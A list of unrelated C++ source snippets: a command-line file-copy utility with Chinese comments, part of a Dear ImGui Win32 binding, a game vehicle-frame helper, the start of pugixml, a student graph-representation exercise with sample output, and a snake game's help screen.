    "#include \"../include/copyOperator.h\"\n\nvoid FileCopyOperator::showVersion(void)\n{\n    printSplitLine(45, '-');\n    WARNING_LOG(\"Software version: \" + SOFTWARE_VERSION + '\\n'); \n    printSplitLine(45, '-');\n\n}\n\nvoid FileCopyOperator::showHelp(void)\n{\n    printSplitLine(65, '-');\n\n    loger(\n            std::clog, NOTIFY,\n            \"Usage:\\n\",\n            \"mycp --help     Get help info.\\n\",\n            \"mycp --version  Get version.\\n\",\n            \"mycp [sorce file] [target path] Copy sorce file to target path.\\n\"\n        );\n\n    printSplitLine(65, '-');\n}\n\nvoid FileCopyOperator::forwardBackwardSwitch(std::string & __path)\n{\n    /*\n        \u82e5\u5728 __srcFile \u4e2d\u6ca1\u6709\u627e\u5230 / \u6216 \\ \u5b57\u7b26\uff0c\n        \u5219\u4ee3\u8868\u5b83\u53ef\u80fd\u662f\u4e00\u4e2a\u7eaf\u6587\u4ef6\uff0c\u6216\u8005\u975e\u6cd5\u5b57\u7b26\u4e32\uff0c\u76f4\u63a5\u539f\u8def\u8fd4\u56de\u5c31\u597d\u3002\n    */\n    if ((__path.find(OS_SPECIFIC_SLASH) == __path.npos)) { return; }\n\n    std::replace(__path.begin(), __path.end(), '/', OS_SPECIFIC_SLASH);\n    std::replace(__path.begin(), __path.end(), '\\\\', OS_SPECIFIC_SLASH);\n}\n\nstd::string FileCopyOperator::getFileType(const std::string & __srcFile)\n{\n    /*\u83b7\u53d6 . \u5b57\u7b26\u7b2c\u4e00\u6b21\u51fa\u73b0\u5728\u5b57\u7b26\u4e32 __srcFile \u4e2d\u7684\u4f4d\u7f6e\u3002*/\n    std::size_t dotPos = __srcFile.find('.');\n\n    /*\u5728\u786e\u4fdd\u5b57\u7b26\u4e32 __srcFile \u6709 . \u5b57\u7b26\u7684\u60c5\u51b5\u4e0b */\n    if (dotPos != __srcFile.npos)\n    {\n        /*\u5206\u5272 . \u5b57\u7b26\u540e\u9762\u7684\u6240\u6709\u5b57\u7b26\uff0c\u5e76\u8fd4\u56de*/\n        return __srcFile.substr(dotPos + 1);\n    }\n    else { return \"\"; } // \u5728 __srcFile \u627e\u4e0d\u5230 . \u5b57\u7b26\u5c31\u8fd4\u56de\u7a7a\u5b57\u7b26\n}\n\nstd::string FileCopyOperator::getFileName(const std::string & __srcFile)\n{\n    // \u67e5\u627e\u6700\u540e\u4e00\u4e2a '/' \u6216 '\\' \uff08\u7531\u4e8e\u5df2\u4f7f\u7528 forwardBackwardSwitch \u7edf\u4e00\u8fc7\uff0c\u6b64\u5904\u53ef\u53ea\u67e5\u627e '/'\n    std::size_t pathPos = __srcFile.rfind(OS_SPECIFIC_SLASH);\n\n    // \u82e5\u627e\u4e0d\u5230 '/'\uff0c\u5219\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\n    if (pathPos == std::string::npos) { return \"\"; }\n\n    // \u5206\u5272\u6700\u540e\u4e00\u4e2a '/' \u540e\u9762\u7684\u6240\u6709\u5b57\u7b26\uff0c\u5e76\u8fd4\u56de\n    return __srcFile.substr(pathPos + 1);\n}\n\nvoid FileCopyOperator::copyFile(std::string __srcFile, std::string __tarPath)\n{\n    /*\u5c06\u4f20\u5165\u7684\u8def\u5f84\u5b57\u7b26\u4e32\u7684\u659c\u6760\u671d\u5411\u5168\u90e8\u6539\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u89c4\u8303\u7684\u659c\u6760*/\n    this->forwardBackwardSwitch(__srcFile);\n    this->forwardBackwardSwitch(__tarPath);\n\n    /*\u7531\u4e8e\u53ef\u80fd\u4f20\u5165\u7684\u975e\u6cd5\u5b57\u7b26\uff0c\u6240\u4ee5\u9700\u8981\u6709\u5f02\u5e38\u673a\u5236*/\n    try\n    {\n        /*\u6253\u5f00\u8981\u88ab\u590d\u5236\u7684\u6587\u4ef6*/\n        this->readFStream.open(__srcFile, std::ios_base::binary);\n\n        if (!this->readFStream.is_open()) \n        { \n            throw std::runtime_error(__srcFile + \" is not exist!\\n\");\n        }\n\n        /*\n            \u5c06\u8981\u88ab\u590d\u5236\u7684\u6587\u4ef6\u548c\u8981\u88ab\u590d\u5236\u5230\u7684\u8def\u5f84\u7ec4\u6210\u65b0\u7684\u6587\u4ef6\u8def\u5f84\uff0c\n            \u5982 ./data/The_Art_of_Patience.txt \u6216 .\\data\\The_Art_of_Patience.txt\n        */\n       std::string targetFile;\n        if (*(__tarPath.end() - 1) == OS_SPECIFIC_SLASH)\n        {\n            targetFile = (__tarPath + this->getFileName(__srcFile));\n        }\n        else \n        {\n            targetFile = (__tarPath + OS_SPECIFIC_SLASH + this->getFileName(__srcFile));\n        }\n\n        loger(\n                std::cout, NOTIFY,\n                \"Copy [\", __srcFile, \"] to [\", targetFile, \"]\\n\"\n        );\n\n        /*\u6253\u5f00 \u6216 \u521b\u5efa\uff08\u5728\u76ee\u6807\u6587\u4ef6\u4e0d\u5b58\u5728\u7684\u60c5\u51b5\u4e0b\uff09targetFile*/\n        this->writeFstream.open(targetFile, std::ios_base::out | std::ios_base::binary);\n\n        if (!this->writeFstream.is_open())\n        {\n            throw std::runtime_error(\"Failed to open the target file: \" + targetFile + '\\n');\n        }\n\n        /*\u5f53\u6ca1\u6709\u8bfb\u5230\u6e90\u6587\u4ef6\u672b\u5c3e\u65f6*/\n        while (!this->readFStream.eof())\n        {\n            /*\u4ece\u6e90\u6587\u4ef6\u6316 bufferSize \u5b57\u8282\u7684\u6570\u636e\u5230 byteBuffer*/\n            readFStream.read(reinterpret_cast<char *>(&this->byteBuffer), BUFFER_SIZE);\n\n            // \u786e\u5b9a\u4e00\u5171\u8bfb\u4e86\u591a\u5c11\u5b57\u8282\u7684\u6570\u636e\uff0c\u907f\u514d\u6587\u4ef6\u672c\u8eab\u6bd4\u7f13\u51b2\u533a\u8fd8\u5c0f\u7684\u60c5\u51b5\u3002\n            std::streamsize bytesRead = readFStream.gcount();\n\n            /*\u628a\u7f13\u51b2\u533a\u5185\u7684\u6570\u636e\u5168\u90e8\u5199\u5165\u76ee\u6807\u6587\u4ef6*/\n            writeFstream.write(reinterpret_cast<char *>(&this->byteBuffer), bytesRead);\n\n            /*\u5199\u5165\u5b57\u8282\u6570\u7d2f\u52a0*/\n            this->sourceFileByteCount += bytesRead;\n\n            if (readFStream.eof()) { break; }\n        }\n\n        loger(\n                std::cout, NOTIFY,\n                \"Size of [\", this->getFileName(__srcFile), \"] = \", \n                (double)this->sourceFileByteCount / 1024, \" KBytes.\\n\"\n        );\n    }\n    catch (const std::exception & __except)\n    {\n        ERROR_LOG(__except.what());\n    }\n}\n\nFileCopyOperator::~FileCopyOperator()\n{\n    this->readFStream.clear();\n    this->writeFstream.clear();\n    this->readFStream.close();\n    this->writeFstream.close();\n}",
    "// dear imgui: Platform Binding for Windows (standard windows API for 32 and 64 bits applications)\n// This needs to be used along with a Renderer (e.g. DirectX11, OpenGL3, Vulkan..)\n#include \"stdafx.h\"\n// Implemented features:\n//  [X] Platform: Clipboard support (for Win32 this is actually part of core imgui)\n//  [X] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange'.\n//  [X] Platform: Keyboard arrays indexed using VK_* Virtual Key Codes, e.g. ImGui::IsKeyPressed(VK_SPACE).\n// Missing features:\n//  [ ] Platform: Gamepad support (best leaving it to user application to fill io.NavInputs[] with gamepad inputs from their source of choice).\n\n#include \"imgui.h\"\n#include \"imgui_impl_win32.h\"\n#ifndef WIN32_LEAN_AND_MEAN\n#define WIN32_LEAN_AND_MEAN\n#endif\n#include <windows.h>\n#include <tchar.h>\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2018-11-30: Misc: Setting up io.BackendPlatformName so it can be displayed in the About Window.\n//  2018-06-29: Inputs: Added support for the ImGuiMouseCursor_Hand cursor.\n//  2018-06-10: Inputs: Fixed handling of mouse wheel messages to support fine position messages (typically sent by track-pads).\n//  2018-06-08: Misc: Extracted imgui_impl_win32.cpp/.h away from the old combined DX9/DX10/DX11/DX12 examples.\n//  2018-03-20: Misc: Setup io.BackendFlags ImGuiBackendFlags_HasMouseCursors and ImGuiBackendFlags_HasSetMousePos flags + honor ImGuiConfigFlags_NoMouseCursorChange flag.\n//  2018-02-20: Inputs: Added support for mouse cursors (ImGui::GetMouseCursor() value and WM_SETCURSOR message handling).\n//  2018-02-06: Inputs: Added mapping for ImGuiKey_Space.\n//  2018-02-06: Inputs: Honoring the io.WantSetMousePos by repositioning the mouse (when using navigation and ImGuiConfigFlags_NavMoveMouse is set).\n//  2018-02-06: Misc: Removed call to ImGui::Shutdown() which is not available from 1.60 WIP, user needs to call CreateContext/DestroyContext themselves.\n//  2018-01-20: Inputs: Added Horizontal Mouse Wheel support.\n//  2018-01-08: Inputs: Added mapping for ImGuiKey_Insert.\n//  2018-01-05: Inputs: Added WM_LBUTTONDBLCLK double-click handlers for window classes with the CS_DBLCLKS flag.\n//  2017-10-23: Inputs: Added WM_SYSKEYDOWN / WM_SYSKEYUP handlers so e.g. the VK_MENU key can be read.\n//  2017-10-23: Inputs: Using Win32 ::SetCapture/::GetCapture() to retrieve mouse positions outside the client area when dragging. \n//  2016-11-12: Inputs: Only call Win32 ::SetCursor(NULL) when io.MouseDrawCursor is set.\n\n// Win32 Data\nstatic HWND                 g_hWnd = 0;\nstatic INT64                g_Time = 0;\nstatic INT64                g_TicksPerSecond = 0;\nstatic ImGuiMouseCursor     g_LastMouseCursor = ImGuiMouseCursor_COUNT;\n\n// Functions\nbool    ImGui_ImplWin32_Init(void* hwnd)\n{\n\tif (!::QueryPerformanceFrequency((LARGE_INTEGER *)&g_TicksPerSecond))\n\t\treturn false;\n\tif (!::QueryPerformanceCounter((LARGE_INTEGER *)&g_Time))\n\t\treturn false;\n\n\t// Setup back-end capabilities flags\n\tg_hWnd = (HWND)hwnd;\n\tImGuiIO& io = ImGui::GetIO();\n\tio.BackendFlags |= ImGuiBackendFlags_HasMouseCursors;         // We can honor GetMouseCursor() values (optional)\n\tio.BackendFlags |= ImGuiBackendFlags_HasSetMousePos;          // We can honor io.WantSetMousePos requests (optional, rarely used)\n\tio.BackendPlatformName = \"imgui_impl_win32\";\n\tio.ImeWindowHandle = hwnd;\n\n\t// Keyboard mapping. ImGui will use those indices to peek into the io.KeysDown[] array that we will update during the application lifetime.\n\tio.KeyMap[ImGuiKey_Tab] = VK_TAB;\n\tio.KeyMap[ImGuiKey_LeftArrow] = VK_LEFT;\n\tio.KeyMap[ImGuiKey_RightArrow] = VK_RIGHT;\n\tio.KeyMap[ImGuiKey_UpArrow] = VK_UP;\n\tio.KeyMap[ImGuiKey_DownArrow] = VK_DOWN;\n\tio.KeyMap[ImGuiKey_PageUp] = VK_PRIOR;\n\tio.KeyMap[ImGuiKey_PageDown] = VK_NEXT;\n\tio.KeyMap[ImGuiKey_Home] = VK_HOME;\n\tio.KeyMap[ImGuiKey_End] = VK_END;\n\tio.KeyMap[ImGuiKey_Insert] = VK_INSERT;\n\tio.KeyMap[ImGuiKey_Delete] = VK_DELETE;\n\tio.KeyMap[ImGuiKey_Backspace] = VK_BACK;\n\tio.KeyMap[ImGuiKey_Space] = VK_SPACE;\n\tio.KeyMap[ImGuiKey_Enter] = VK_RETURN;\n\tio.KeyMap[ImGuiKey_Escape] = VK_ESCAPE;\n\tio.KeyMap[ImGuiKey_A] = 'A';\n\tio.KeyMap[ImGuiKey_C] = 'C';\n\tio.KeyMap[ImGuiKey_V] = 'V';\n\tio.KeyMap[ImGuiKey_X] = 'X';\n\tio.KeyMap[ImGuiKey_Y] = 'Y';\n\tio.KeyMap[ImGuiKey_Z] = 'Z';\n\n\treturn true;\n}\n\nvoid    ImGui_ImplWin32_Shutdown()\n{\n\tg_hWnd = (HWND)0;\n}\n\nstatic bool ImGui_ImplWin32_UpdateMouseCursor()\n{\n\tImGuiIO& io = ImGui::GetIO();\n\tif (io.ConfigFlags & ImGuiConfigFlags_NoMouseCursorChange)\n\t\treturn false;\n\n\tImGuiMouseCursor imgui_cursor = ImGui::GetMouseCursor();\n\tif (imgui_cursor == ImGuiMouseCursor_None || io.MouseDrawCursor)\n\t{\n\t\t// Hide OS mouse cursor if imgui is drawing it or if it wants no cursor\n\t\t::SetCursor(NULL);\n\t}\n\telse\n\t{\n\t\t// Show OS mouse cursor\n\t\tLPTSTR win32_cursor = IDC_ARROW;\n\t\tswitch (imgui_cursor)\n\t\t{\n\t\tcase ImGuiMouseCursor_Arrow:        win32_cursor = IDC_ARROW; break;\n\t\tcase ImGuiMous",
    "#include \"VehicleDummy.h\"\n\nstd::vector<RwFrame*> VehicleDummy::m_Frames;\nRwMatrix* tempMat = NULL;\n\nvoid VehicleDummy::FindDummies(CVehicle* vehicle, RwFrame* frame) {\n\tif (!frame)\n\t\treturn;\n\n\tif (RwFrame* nextFrame = frame->child)\n\t\tFindDummies(vehicle, nextFrame);\n\n\tif (RwFrame* nextFrame = frame->next)\n\t\tFindDummies(vehicle, nextFrame);\n\n\tif (std::find(m_Frames.begin(), m_Frames.end(), frame) != m_Frames.end())\n\t\treturn;\n\n\tm_Frames.push_back(frame);\n}\n\nstd::vector<RwFrame*> VehicleDummy::GetFramesOnVehicle(CVehicle* vehicle) {\n\tm_Frames.clear();\n\tFindDummies(vehicle, (RwFrame*)vehicle->m_pRwClump->object.parent);\n\treturn m_Frames;\n}\n\nstd::vector<RwFrame*> VehicleDummy::GetFrameHierarchy(RwFrame* frame, RwFrame* root) {\n\tstd::vector<RwFrame*> hie;\n\tRwFrame* f = frame;\n\n\twhile (f != NULL && f != root)\n\t{\n\t\thie.insert(hie.begin(), f);\n\t\tf = RwFrameGetParent(f);\n\t}\n\treturn hie;\n}\n\nCVector VehicleDummy::GetTransformedPosition(CVehicle* vehicle, CVector position) {\n\tif (!tempMat) tempMat = RwMatrixCreate();\n\n\tauto rootFrame = (RwFrame*)vehicle->m_pRwClump->object.parent;\n\tauto c = rootFrame->child;\n\n\t//Log::file << \"child= \" << GetFrameNodeName(c) << std::endl;\n\n\tRwMatrixTransform(tempMat, RwFrameGetMatrix(rootFrame), rwCOMBINEREPLACE);\n\n\tif (ToLower(GetFrameNodeName(c)).find(\"chassis_dummy\") != -1)\n\t{\n\t\tRwMatrixTransform(tempMat, RwFrameGetMatrix(c), rwCOMBINEPRECONCAT);\n\t}\n\n\tRwMatrixTranslate(tempMat, &position.ToRwV3d(), rwCOMBINEPRECONCAT);\n\n\treturn CVector(tempMat->pos.x, tempMat->pos.y, tempMat->pos.z);\n}\n\nCVector VehicleDummy::GetTransformedDummyPosition(CVehicle* vehicle, RwFrame* dummy, CVector offset) {\n\tif (!tempMat) tempMat = RwMatrixCreate();\n\n\tauto rootFrame = (RwFrame*)vehicle->m_pRwClump->object.parent;\n\n\tRwMatrixTransform(tempMat, RwFrameGetMatrix(rootFrame), rwCOMBINEREPLACE);\n\n\tauto hierarchy = GetFrameHierarchy(dummy, rootFrame);\n\tfor (auto hf : hierarchy) {\n\t\tRwMatrixTransform(tempMat, RwFrameGetMatrix(hf), rwCOMBINEPRECONCAT);\n\t}\n\n\tRwMatrixTranslate(tempMat, &offset.ToRwV3d(), rwCOMBINEPRECONCAT);\n\n\treturn CVector(tempMat->pos.x, tempMat->pos.y, tempMat->pos.z);\n}\n\nCVector VehicleDummy::FindTransformedDummyPosition(CVehicle* vehicle, std::string dummyName, CVector offset) {\n\tauto frames = VehicleDummy::GetFramesOnVehicle(vehicle);\n\n\tfor (auto frame : frames)\n\t{\n\t\tstd::string frameName = ToLower(GetFrameNodeName(frame));\n\n\t\tif (frameName.compare(ToLower(dummyName)) == 0) {\n\t\t\treturn VehicleDummy::GetTransformedDummyPosition(vehicle, frame, offset);\n\t\t}\n\t}\n\n\treturn CVector(0, 0, 0);\n}",
    "/**\n * pugixml parser - version 1.14\n * --------------------------------------------------------\n * Copyright (C) 2006-2024, by Arseny Kapoulkine (arseny.kapoulkine@gmail.com)\n * Report bugs and download new versions at https://pugixml.org/\n *\n * This library is distributed under the MIT License. See notice at the end\n * of this file.\n *\n * This work is based on the pugxml parser, which is:\n * Copyright (C) 2003, by Kristen Wegner (kristen@tima.net)\n */\n\n#ifndef SOURCE_PUGIXML_CPP\n#define SOURCE_PUGIXML_CPP\n\n#include \"pugixml.hpp\"\n\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n#include <assert.h>\n#include <limits.h>\n\n#ifdef PUGIXML_WCHAR_MODE\n#\tinclude <wchar.h>\n#endif\n\n#ifndef PUGIXML_NO_XPATH\n#\tinclude <math.h>\n#\tinclude <float.h>\n#endif\n\n#ifndef PUGIXML_NO_STL\n#\tinclude <istream>\n#\tinclude <ostream>\n#\tinclude <string>\n#endif\n\n// For placement new\n#include <new>\n\n// For load_file\n#if defined(__linux__) || defined(__APPLE__)\n#include <sys/stat.h>\n#endif\n\n#ifdef _MSC_VER\n#\tpragma warning(push)\n#\tpragma warning(disable: 4127) // conditional expression is constant\n#\tpragma warning(disable: 4324) // structure was padded due to __declspec(align())\n#\tpragma warning(disable: 4702) // unreachable code\n#\tpragma warning(disable: 4996) // this function or variable may be unsafe\n#endif\n\n#if defined(__clang__)\n#\tpragma clang diagnostic push\n#\tpragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\" // NULL as null pointer constant\n#endif\n\n#if defined(_MSC_VER) && defined(__c2__)\n#\tpragma clang diagnostic push\n#\tpragma clang diagnostic ignored \"-Wdeprecated\" // this function or variable may be unsafe\n#endif\n\n#ifdef __INTEL_COMPILER\n#\tpragma warning(disable: 177) // function was declared but never referenced\n#\tpragma warning(disable: 279) // controlling expression is constant\n#\tpragma warning(disable: 1478 1786) // function was declared \"deprecated\"\n#\tpragma warning(disable: 1684) // conversion from pointer to same-sized integral type\n#endif\n\n#if defined(__BORLANDC__) && defined(PUGIXML_HEADER_ONLY)\n#\tpragma warn -8080 // symbol is declared but never used; disabling this inside push/pop bracket does not make the warning go away\n#endif\n\n#ifdef __BORLANDC__\n#\tpragma option push\n#\tpragma warn -8008 // condition is always false\n#\tpragma warn -8066 // unreachable code\n#endif\n\n#ifdef __SNC__\n// Using diag_push/diag_pop does not disable the warnings inside templates due to a compiler bug\n#\tpragma diag_suppress=178 // function was declared but never referenced\n#\tpragma diag_suppress=237 // controlling expression is constant\n#endif\n\n#ifdef __TI_COMPILER_VERSION__\n#\tpragma diag_suppress 179 // function was declared but never referenced\n#endif\n\n// Inlining controls\n#if defined(_MSC_VER) && _MSC_VER >= 1300\n#\tdefine PUGI_IMPL_NO_INLINE __declspec(noinline)\n#elif defined(__GNUC__)\n#\tdefine PUGI_IMPL_NO_INLINE __attribute__((noinline))\n#else\n#\tdefine PUGI_IMPL_NO_INLINE\n#endif\n\n// Branch weight controls\n#if defined(__GNUC__) && !defined(__c2__)\n#\tdefine PUGI_IMPL_UNLIKELY(cond) __builtin_expect(cond, 0)\n#else\n#\tdefine PUGI_IMPL_UNLIKELY(cond) (cond)\n#endif\n\n// Simple static assertion\n#define PUGI_IMPL_STATIC_ASSERT(cond) { static const char condition_failed[(cond) ? 1 : -1] = {0}; (void)condition_failed[0]; }\n\n// Digital Mars C++ bug workaround for passing char loaded from memory via stack\n#ifdef __DMC__\n#\tdefine PUGI_IMPL_DMC_VOLATILE volatile\n#else\n#\tdefine PUGI_IMPL_DMC_VOLATILE\n#endif\n\n// Integer sanitizer workaround; we only apply this for clang since gcc8 has no_sanitize but not unsigned-integer-overflow and produces \"attribute directive ignored\" warnings\n#if defined(__clang__) && defined(__has_attribute)\n#\tif __has_attribute(no_sanitize)\n#\t\tdefine PUGI_IMPL_UNSIGNED_OVERFLOW __attribute__((no_sanitize(\"unsigned-integer-overflow\")))\n#\telse\n#\t\tdefine PUGI_IMPL_UNSIGNED_OVERFLOW\n#\tendif\n#else\n#\tdefine PUGI_IMPL_UNSIGNED_OVERFLOW\n#endif\n\n// Borland C++ bug workaround for not defining ::memcpy depending on header include order (can't always use std::memcpy because some compilers don't have it at all)\n#if defined(__BORLANDC__) && !defined(__MEM_H_USING_LIST)\nusing std::memcpy;\nusing std::memmove;\nusing std::memset;\n#endif\n\n// Old versions of GCC do not define ::malloc and ::free depending on header include order\n#if defined(__GNUC__) && (__GNUC__ < 3 || (__GNUC__ == 3 && __GNUC_MINOR__ < 4))\nusing std::malloc;\nusing std::free;\n#endif\n\n// Some MinGW/GCC versions have headers that erroneously omit LLONG_MIN/LLONG_MAX/ULLONG_MAX definitions from limits.h in some configurations\n#if defined(PUGIXML_HAS_LONG_LONG) && defined(__GNUC__) && !defined(LLONG_MAX) && !defined(LLONG_MIN) && !defined(ULLONG_MAX)\n#\tdefine LLONG_MIN (-LLONG_MAX - 1LL)\n#\tdefine LLONG_MAX __LONG_LONG_MAX__\n#\tdefine ULLONG_MAX (LLONG_MAX * 2ULL + 1ULL)\n#endif\n\n// In some environments MSVC is a compiler but the CRT lacks certain MSVC-specific features\n#if defined(_MSC_VER) && !defined(__S3E__) && !defined(_WIN32_WCE)\n#\tdefine PUGI_IMPL_MSVC_CRT_VERS",
    "Practical No: 06\r\nTitle: A C++ Program to Represent Graph Data Structure using Adjacency Matrix and List.\r\n Input : A Graph (04 Nodes and 06 Edges)\r\n Outputs:\r\n a) Represent Graph using Adjacency Matrix\r\n b) Represent Graph using Adjacency List\r\n c) DFS Traversal on Adjacency Matrix Representation\r\n d) BFS Traversal on Adjacency List Representation\r\n\r\n*******************************************************************************/\r\n//......Header Files\r\n#include <iostream>\r\nusing namespace std;\r\nint adjMtx[4][4]; //....for Adjacency Matrix\r\nint Row = 4;\r\nint Col = 4;\r\nstruct Node //....for Adjancency List\r\n{\r\n char data;\r\n struct Node *down, *next;\r\n}*Head;\r\n//......Function to return Vertex Name\r\nchar vertex(int val)\r\n{\r\n if(val == 0)\r\n return 'A';\r\n else if(val == 1)\r\n return 'B';\r\n else if(val == 2)\r\n return 'C';\r\n else\r\n return 'D';\r\n}\r\n//......Function to Create Adjacency Matrix\r\nvoid create_adjMtx()\r\n{\r\n int i, j;\r\n\r\n for(i=0; i<Row; i++)\r\n {\r\n for(j=0; j<Col; j++)\r\n {\r\n cout<<\"\\n Is Edge from vertex \"<<vertex(i)<<\" to \"<<vertex(j)<<\" ? : \";\r\n cin>>adjMtx[i][j];\r\n }\r\n }\r\n}\r\n//......Function to Display Adjacency Matrix\r\nvoid display_adjMtx()\r\n{\r\n int i, j;\r\n\r\n for(i=0; i<Row; i++)\r\n {\r\n cout<<\"\\n\";\r\n for(j=0; j<Col; j++)\r\n {\r\n cout<<\"\\t\"<<adjMtx[i][j];\r\n }\r\n }\r\n}\r\n//......Function to Create Adjacency List\r\nvoid create_adjList()\r\n{\r\n struct Node *Newnode, *move, *p;\r\n int i;\r\n int nodes;\r\n int edges;\r\n\r\n cout<<\"\\n\\n How many Vertices in Graph: \";\r\n cin>>nodes;\r\n\r\n for(i=0; i<nodes; i++)\r\n {\r\n Newnode = new struct Node;\r\n\r\n Newnode->data = vertex(i);\r\n Newnode->down = NULL;\r\n Newnode->next = NULL;\r\n\r\n if(Head == NULL)\r\n {\r\n Head = Newnode;\r\n move = Head;\r\n }\r\n else\r\n {\r\n move->down = Newnode;\r\n move = move->down;\r\n }\r\n\r\n }\r\n\r\n move = Head;\r\n p = Head;\r\n while(move != NULL)\r\n {\r\n cout<<\"\\n How many adjacent vertices for \"<<move->data<<\" : \";\r\n cin>>edges;\r\n\r\n for(i=0; i<edges; i++)\r\n {\r\n Newnode = new struct Node;\r\n\r\n cout<<\"\\n\\t Enter An Adjacent Vertex: \";\r\n cin>>Newnode->data;\r\n Newnode->down = NULL;\r\n Newnode->next = NULL;\r\n\r\n p->next = Newnode;\r\n p = p->next;\r\n }\r\n\r\n move = move->down;\r\n p = move;\r\n }\r\n\r\n}\r\n//......Function to Display Adjacency List\r\nvoid display_adjList()\r\n{\r\n struct Node *move, *p;\r\n\r\n move = Head;\r\n\r\n while(move != NULL)\r\n {\r\n cout<<\"\\n\\t | \"<<move->data<<\" |--> \";\r\n p = move->next;\r\n while(p != NULL)\r\n {\r\n cout<<p->data<<\" --> \";\r\n p = p->next;\r\n }\r\n cout<<\"NULL\";\r\n\r\n move = move->down;\r\n p = move;\r\n }\r\n}\r\n//......Main Function\r\nint main()\r\n{\r\n cout<<\"\\n\\n A C++ Program to Represent Graph Data Structure using Adjacency Matrix\r\nand List.\";\r\n\r\n cout<<\"\\n\\n 1. Creating Adjacency Matrix.........\";\r\n create_adjMtx();\r\n\r\n cout<<\"\\n\\n 2. Display Adjacency Matrix.........\";\r\n display_adjMtx();\r\n\r\n cout<<\"\\n\\n 3. Create Adjacency List.........\";\r\n Head = NULL;\r\n create_adjList();\r\n\r\n cout<<\"\\n\\n 4. Display Adjacency List.........\";\r\n display_adjList();\r\n\r\n //DFS_Traversal();\r\n\r\n //BFS_Traversal();\r\n return 0;\r\n}\r\n/*---------------------OUTPUT--------------------------\r\nA C++ Program to Represent Graph Data Structure using Adjacency Matrix and List.\r\n 1. Creating Adjacency Matrix.........\r\n Is Edge from vertex A to A ? : 0\r\n Is Edge from vertex A to B ? : 1\r\n Is Edge from vertex A to C ? : 1\r\n Is Edge from vertex A to D ? : 1\r\n Is Edge from vertex B to A ? : 1\r\n Is Edge from vertex B to B ? : 0\r\n Is Edge from vertex B to C ? : 1\r\n Is Edge from vertex B to D ? : 1\r\n Is Edge from vertex C to A ? : 1\r\n Is Edge from vertex C to B ? : 1\r\n Is Edge from vertex C to C ? : 0\r\n Is Edge from vertex C to D ? : 1\r\n Is Edge from vertex D to A ? : 1\r\n Is Edge from vertex D to B ? : 1\r\n Is Edge from vertex D to C ? : 1\r\n Is Edge from vertex D to D ? : 0\r\n 2. Display Adjacency Matrix.........\r\n 0 1 1 1\r\n 1 0 1 1\r\n 1 1 0 1\r\n 1 1 1 0\r\n\r\n3. Create Adjacency List.........\r\n How many Vertices in Graph: 4\r\n How many adjacent vertices for A : 3\r\n Enter An Adjacent Vertex: B\r\n Enter An Adjacent Vertex: C\r\n Enter An Adjacent Vertex: D\r\n How many adjacent vertices for B : 3\r\n Enter An Adjacent Vertex: A\r\n Enter An Adjacent Vertex: C\r\n Enter An Adjacent Vertex: D\r\n How many adjacent vertices for C : 3\r\n Enter An Adjacent Vertex: A\r\n Enter An Adjacent Vertex: B\r\n Enter An Adjacent Vertex: D\r\n How many adjacent vertices for D : 3\r\n Enter An Adjacent Vertex: A\r\n Enter An Adjacent Vertex: B\r\n Enter An Adjacent Vertex: C\r\n4. Display Adjacency List.........\r\n | A |--> B --> C --> D --> NULL\r\n | B |--> A --> C --> D --> NULL\r\n | C |--> A --> B --> D --> NULL\r\n | D |--> A --> B --> C --> NULL\r\n...Program finished with exit code 0\r\nPress ENTER to exit console.\r\n*/\r\n",
    "\ufeff#include \"HowToPlay.h\"\nHowToPlay::HowToPlay(std::shared_ptr<Context>& context) : m_context{ context } {\n\n}\n\nHowToPlay::~HowToPlay() {\n\n}\n\n\nvoid HowToPlay::Init() {\n\t// Title\n\tfor (auto& title : m_HTPTitle) {\n\t\ttitle.setFont(m_context->m_Assets->Get_Font(MAIN_FONT));\n\t\ttitle.setFillColor(sf::Color(255, 51, 153));\n\t}\n\t\n\tm_HTPTitle[0].setString(\"How To Play?\");\n\tm_HTPTitle[0].setPosition(sf::Vector2f(100, 100));\n\tm_HTPTitle[0].setCharacterSize(40);\n\n\tm_HTPTitle[1].setPosition(sf::Vector2f(100, 100 + 375));\n\tm_HTPTitle[1].setString(\"Press Escape To Return\");\n\tm_HTPTitle[1].setCharacterSize(40);\n\n\tfor (auto& text : m_HTPText) {\n\t\ttext.setFont(m_context->m_Assets->Get_Font(MAIN_FONT));\n\t\ttext.setFillColor(sf::Color(0x33ccff));\n\t}\n\tm_HTPText[0].setPosition(sf::Vector2f(25, 100 + 75));\n\tm_HTPText[0].setString(\"- Do not hit a wall and do not bite your own tail.\");\n\n\tm_HTPText[1].setPosition(sf::Vector2f(25, 100 + 125));\n\tm_HTPText[1].setString(\"- Crashing into a wall or your tail will end the game immediately.\");\n\n\tm_HTPText[2].setPosition(sf::Vector2f(25, 100 + 175));\n\tm_HTPText[2].setString(\"- 1 points will be added to the score for eating the fruit.\");\n\n\tm_HTPText[3].setPosition(sf::Vector2f(25, 100 + 225));\n\tm_HTPText[3].setString(\"- The length of the snake will be increased after eating the fruits.\");\n\n\tm_HTPText[4].setPosition(sf::Vector2f(25, 100 + 275));\n\tm_HTPText[4].setString(\"- Use keyboard Up, Down, Left, Right to move the snake.\");\n\n\n\tm_BackGoundImg.setTexture(m_context->m_Assets->Get_Texture(BACKGROUNDIMAGE));\n\n}\n\nvoid HowToPlay::ProcessInput() {\n\tsf::Event ev;\n\twhile (m_context->m_window->pollEvent(ev)) {\n\t\tif (ev.type == sf::Event::Closed)\n\t\t\tm_context->m_window->close();\n\t\telse if (ev.type == sf::Event::KeyPressed) {\n\t\t\tswitch (ev.key.code) {\n\t\t\t\tcase sf::Keyboard::Escape: {\n\t\t\t\t\tm_context->m_States->Add(std::make_unique<Main_Menu>(m_context), true);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid HowToPlay::Update(sf::Time deltaTime) {\n\n}\n\nvoid HowToPlay::Render() {\n\tm_context->m_window->clear();\n\tm_context->m_window->draw(m_BackGoundImg);\n\tfor (auto& text : m_HTPText) {\n\t\tm_context->m_window->draw(text);\n\t}\n\tfor (auto &title : m_HTPTitle)\n\t\tm_context->m_window->draw(title);\n\tm_context->m_window->display();\n}",
